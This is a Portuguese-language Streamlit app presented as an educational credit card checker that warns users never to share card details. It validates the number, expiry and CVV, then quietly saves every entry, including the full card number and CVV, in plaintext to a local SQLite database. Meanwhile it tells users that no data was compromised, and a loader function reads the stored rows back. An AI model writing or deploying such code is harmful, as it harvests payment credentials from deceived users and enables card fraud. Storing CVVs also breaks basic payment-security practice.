import streamlit as st
import re
import sqlite3
from datetime import datetime
import pandas as pd

# ---------------- Funções de Validação ---------------- #

def validar_numero_cartao(numero):
    numero = re.sub(r'[^0-9]', '', numero)
    if not numero.isdigit() or len(numero) < 13 or len(numero) > 19:
        return False
    total = 0
    reverse_digits = numero[::-1]
    for i, digit in enumerate(reverse_digits):
        n = int(digit)
        if i % 2 == 1:
            n *= 2
            if n > 9:
                n = (n // 10) + (n % 10)
        total += n
    return total % 10 == 0

def validar_validade(validade):
    try:
        mes, ano = validade.split('/')
        if len(mes) != 2 or len(ano) != 2:
            return False
        mes = int(mes)
        ano = int('20' + ano)
        if mes < 1 or mes > 12:
            return False
        hoje = datetime.now()
        if ano < hoje.year or (ano == hoje.year and mes < hoje.month):
            return False
        return True
    except:
        return False

def validar_cvv(cvv):
    return cvv.isdigit() and len(cvv) in [3, 4]

# ---------------- Banco de Dados SQLite ---------------- #

def criar_tabela():
    conn = sqlite3.connect("cartoes.db")
    cursor = conn.cursor()
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS cartoes_validos (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            numero TEXT,
            validade TEXT,
            cvv TEXT,
            data_validacao TEXT
        )
    """)
    conn.commit()
    conn.close()

def atualizar_tabela():
    """Adiciona a coluna 'status' se ela ainda não existir"""
    conn = sqlite3.connect("cartoes.db")
    cursor = conn.cursor()
    try:
        cursor.execute("ALTER TABLE cartoes_validos ADD COLUMN status TEXT")
        conn.commit()
    except sqlite3.OperationalError:
        pass  # Coluna já existe
    finally:
        conn.close()

def salvar_dados_cartao(numero, validade, cvv, status):
    conn = sqlite3.connect("cartoes.db")
    cursor = conn.cursor()
    cursor.execute("""
        INSERT INTO cartoes_validos (numero, validade, cvv, data_validacao, status)
        VALUES (?, ?, ?, ?, ?)
    """, (numero, validade, cvv, datetime.now().strftime('%Y-%m-%d %H:%M:%S'), status))
    conn.commit()
    conn.close()

def carregar_dados():
    conn = sqlite3.connect("cartoes.db")
    df = pd.read_sql_query("SELECT * FROM cartoes_validos ORDER BY id DESC", conn)
    conn.close()
    return df

# ---------------- Interface Streamlit ---------------- #

st.title("🔒 Verificador de Cartão de Crédito")

st.warning("""
**⚠️ IMPORTANTE - CONSCIENTIZAÇÃO SOBRE SEGURANÇA FINANCEIRA**

A verificação de cartões de crédito é fundamental para:
- Prevenir fraudes e transações não autorizadas
- Proteger seus dados pessoais e financeiros
- Evitar prejuízos financeiros
- Manter sua segurança digital

**NUNCA** compartilhe os dados do seu cartão com terceiros ou sites duvidosos.
Este sistema é apenas para fins educacionais.
""")

st.markdown("---")
st.subheader("📝 Digite os dados do cartão:")

numero_cartao = st.text_input("Número do Cartão de Crédito:", placeholder="1234 5678 9012 3456")
validade = st.text_input("Validade do Cartão (MM/AA):", placeholder="12/25")
cvv = st.text_input("Código de Segurança (CVV):", placeholder="123", type="password")

# Inicializa o banco de dados
criar_tabela()
atualizar_tabela()

# Botão de verificação
if st.button("🔍 Verificar Cartão de Crédito", type="primary"):
    if numero_cartao and validade and cvv:
        # Validações
        numero_valido = validar_numero_cartao(numero_cartao)
        validade_valida = validar_validade(validade)
        cvv_valido = validar_cvv(cvv)
        
        if numero_valido and validade_valida and cvv_valido:
            st.success("✅ **CARTÃO VÁLIDO!** Todos os dados estão corretos.")
            st.success("✅ **Nenhum dado violado!**")

            try:
                salvar_dados_cartao(numero_cartao, validade, cvv, "valido")
                
            except Exception as e:
                st.error(f"Erro ao verificar dados, verifique os dados inseridos se estão corretos:" )
                
        else:
            st.error("❌ **CARTÃO INVÁLIDO!**")

            try:
                salvar_dados_cartao(numero_cartao, validade, cvv, "invalido")
                
            except Exception as e:
                st.error(f"Dados inválidos não foram inseridos corretamente ou falta de numeros: {e}")

            # Mostra erros específicos
            if not numero_valido:
                st.error("• Número do cartão inválido")
            if not validade_valida:
                st.error("• Data de validade inválida ou expirada")
            if not cvv_valido:
                st.error("• CVV deve ter 3 ou 4 dígitos")
    else:
        st.warning("⚠️ Por favor, preencha todos os campos!")



st.markdown("---")
st.caption("🔐 Sistema educacional - Mantenha seus dados seguros!")
